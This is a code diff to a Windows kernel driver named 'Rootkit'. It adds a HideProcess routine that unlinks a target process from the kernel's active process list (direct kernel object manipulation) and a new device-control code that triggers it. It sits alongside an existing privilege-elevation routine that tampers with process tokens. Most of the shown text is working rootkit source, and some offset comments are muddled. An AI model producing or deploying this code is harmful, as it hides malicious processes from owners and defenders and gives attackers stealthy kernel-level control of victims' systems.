@@ -3,6 +3,7 @@
 #pragma warning(disable: 4100)  // Unreferenced formal parameter
 #pragma warning(disable : 4099)
 #define TOKEN_OFFSET 0x4b8
+#define ACTIVE_PROCESS_LINKS_OFFSET 0x448
 
 void debug_print(PCSTR text) {
     KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, text));
@@ -11,6 +12,82 @@ void debug_print(PCSTR text) {
 /*
 Functions
 */
+
+VOID FlinkBlinkHide(PLIST_ENTRY Current) {
+    PLIST_ENTRY Prev, Next;
+
+    // Get the previous and next list entries from the current entry
+    Prev = (Current->Blink);
+    Next = (Current->Flink);
+
+    // Unlink the current entry from the list:
+    // 1. Set the previous entry's Flink (forward link) to the point of the next entry
+    Prev->Flink = Next;
+    // 2. Set the next entry's Blink (Backwards Link) to point to the previous entry
+    Next->Blink = Prev;
+    // We now have hidden the current entry.
+
+    // To avoid a crash (BSOD) due to dangling pointers, rewrite the current entry's pointers so that they refer to itself.
+    // This makes it an isolated circular list.
+    Current->Blink = (PLIST_ENTRY)&Current->Flink;
+    Current->Flink = (PLIST_ENTRY)&Current->Flink;
+    return;
+}
+
+VOID HideProcess(UINT32 PID) {
+    // Assume ACTIVE_PROCESS_LINKS_OFFSET is the offset to the process ID within the EPROCESS struct.
+    // Here, PID_OFFSET is set to that offset.
+    ULONG PID_OFFSET = ACTIVE_PROCESS_LINKS_OFFSET;
+    ULONG LIST_OFFSET = PID_OFFSET;
+
+    // The code uses an INT_PTR variable to adjust LIST_OFFSET
+    // Essentially, LIST_OFFSET is advanced by the size of the pointer itself (likely 8 bytes)
+    INT_PTR ptr;
+    LIST_OFFSET += sizeof(ptr);
+
+    // Get the current process (starting point to start traversing)
+    PEPROCESS CurrentEPROCESS = PsGetCurrentProcess();
+
+    // Calculate the pointer to the current process's ActiveProcessList list entry.
+    PLIST_ENTRY CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
+
+    // Calculate the address of the current pointer PID field. (basically, gets his PID from within the current EPROCESS structure, using the known offset.)
+    PUINT32 CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
+
+    // First check if this current process, is the one we want to hide (by checking its pid using CurrentPID)
+    if (*(UINT32*)CurrentPID == PID) {
+        // If the current process PID is the one we want to hide, the hide it by unlinking it from its list entry.
+        FlinkBlinkHide(CurrentList);
+        return;
+    }
+    // Otherwise, we set a starting point to start looping.
+    PEPROCESS StartProcess = CurrentEPROCESS;
+
+
+    // Move to the next process in the list.
+    // The next process's EPROCESS is computed by taking the pointer from CurrentList->Flink
+    // then subtracting LIST_OFFSET to get back to the base of the EPROCESS structure.
+    CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
+    CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
+    CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
+
+
+    // Traverse the process list until we circle back to the starting process (looping)
+    while ((ULONG_PTR)StartProcess != (ULONG_PTR)CurrentEPROCESS) {
+        // If the current process PID in the loop matches the one we want to hide, we unlink it from the list.
+        if (*(UINT32*)CurrentPID == PID) {
+            FlinkBlinkHide(CurrentList);
+            return;
+        }
+
+        // Move to the next process: adjust the pointer based on the list entry.
+        CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
+        CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
+        CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
+    }
+    // Return the result.
+    return;
+}
 
 NTSTATUS ElevateProcess(UINT32 PID) {
     DbgPrint("[+] Starting to elevate process %u.\n", PID);
@@ -112,6 +189,8 @@ namespace Rootkit {
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x696, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
         constexpr ULONG ElevateProcess =
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x697, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        constexpr ULONG HideProcess =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x698, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
     }
     struct Request {
         HANDLE process_id;
@@ -156,7 +235,7 @@ namespace Rootkit {
 
         // Declare DriverObject before the switch statement
         PDRIVER_OBJECT DriverObject = nullptr;
-        
+
         // The target process we want to access, init here.
         static PEPROCESS target_process = nullptr;
 
@@ -177,6 +256,9 @@ namespace Rootkit {
             //status = PsLookupProcessByProcessId(request->process_id, &target_process);
             ElevateProcess(HandleToUlong(pid));
             // Use target_process in the ElevateProcess function.
+            break;
+        case codes::HideProcess:
+            HideProcess(HandleToUlong(pid));
             break;
         default:
             // something is horribly wrong
@@ -200,7 +282,7 @@ NTSTATUS DriverMain(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path)
 
     PDEVICE_OBJECT device_object = nullptr;
     NTSTATUS status = IoCreateDevice(driver_object, 0, &device_name, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN,
-                                     FALSE, &device_object);
+        FALSE, &device_object);
 
     if (status != STATUS_SUCCESS) {
         debug_print("[!] Failed to create device driver.\n");
